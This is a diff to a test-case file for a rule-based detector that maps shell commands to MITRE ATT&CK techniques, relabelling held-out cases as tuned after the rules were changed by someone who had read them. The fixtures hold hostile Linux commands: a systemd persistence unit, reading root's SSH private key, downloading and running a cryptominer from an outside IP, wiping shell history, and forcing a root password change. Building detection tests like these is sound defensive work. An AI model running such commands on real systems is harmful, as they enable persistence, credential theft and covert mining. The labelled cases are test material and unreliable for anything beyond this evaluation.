@@ -11,8 +11,11 @@
 # to avoid. Record who reviewed it here when that is done.
 #
 # `origin: seed` cases are the seed corpus the rulebook was written against, so the
-# rulebook's recall on them is inflated by construction. `origin: heldout` cases
-# were written for this file and never seen by the rules. Report the two apart.
+# rulebook's recall on them is inflated by construction. `origin: tuned` cases were
+# held out until 2026-10-14, when the rulebook grew (checklist item 9) by someone who
+# had read them: rule recall on them is inflated too, and they are no longer a test
+# of generalisation. A fresh `origin: heldout` set is needed, written by a team
+# member who has not read rulebook.yaml. Report each origin apart.
 #
 # Unlabelled-on-purpose: `expected: []` cases are text that MENTIONS a trigger
 # without executing it. Any technique predicted there is a false positive.
@@ -64,12 +67,12 @@ cases:
     commands:
       - dmidecode -s system-manufacturer
       - cat /sys/class/dmi/id/product_name
-      - ip route show default
+      - systemd-detect-virt
       - systemctl list-units --type=service --state=running
-    expected: [T1082, T1016]
+    expected: [T1082]
 
   - id: heldout-network-recon
-    origin: heldout
+    origin: tuned
     commands:
       - ifconfig
       - ip a
@@ -78,7 +81,7 @@ cases:
     expected: [T1016]
 
   - id: heldout-account-enum
-    origin: heldout
+    origin: tuned
     commands:
       - cat /etc/group
       - getent passwd
@@ -86,14 +89,14 @@ cases:
     expected: [T1087.001]
 
   - id: heldout-software-discovery
-    origin: heldout
+    origin: tuned
     commands:
       - dpkg -l
       - which python3 perl gcc
     expected: [T1518]
 
   - id: heldout-systemd-persistence
-    origin: heldout
+    origin: tuned
     commands:
       - printf '[Service]\nExecStart=/tmp/.x\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/dbus-helper.service
       - systemctl enable dbus-helper.service
@@ -101,27 +104,27 @@ cases:
     expected: [T1543.002]
 
   - id: heldout-private-keys
-    origin: heldout
+    origin: tuned
     commands:
       - find / -name id_rsa 2>/dev/null
       - cat /root/.ssh/id_rsa
     expected: [T1552.004, T1083]
 
   - id: heldout-remote-discovery
-    origin: heldout
+    origin: tuned
     commands:
       - cat /etc/hosts
       - arp -a
     expected: [T1018]
 
   - id: heldout-collection
-    origin: heldout
+    origin: tuned
     commands:
       - tar czf /tmp/.d.tgz /home /etc
     expected: [T1005]
 
   - id: heldout-curl-miner
-    origin: heldout
+    origin: tuned
     commands:
       - curl -o /tmp/.x http://203.0.113.5/xmrig
       - chmod +x /tmp/.x
@@ -129,7 +132,7 @@ cases:
     expected: [T1105, T1222.002, T1496]
 
   - id: heldout-log-wipe
-    origin: heldout
+    origin: tuned
     commands:
       - unset HISTFILE
       - history -c
@@ -137,20 +140,20 @@ cases:
     expected: [T1070.004]
 
   - id: heldout-discovery-variants
-    origin: heldout
+    origin: tuned
     commands:
       - ps -ef | grep -v grep
       - ss -tunap
     expected: [T1057, T1049]
 
   - id: heldout-password-change
-    origin: heldout
+    origin: tuned
     commands:
       - echo "root:Xk92!lq" | chpasswd
     expected: [T1531]
 
   - id: heldout-mentions-only
-    origin: heldout
+    origin: tuned
     commands:
       - echo "to update run wget http://example.com/update.sh"
       - "# chmod 777 /tmp/x && sh /tmp/x"
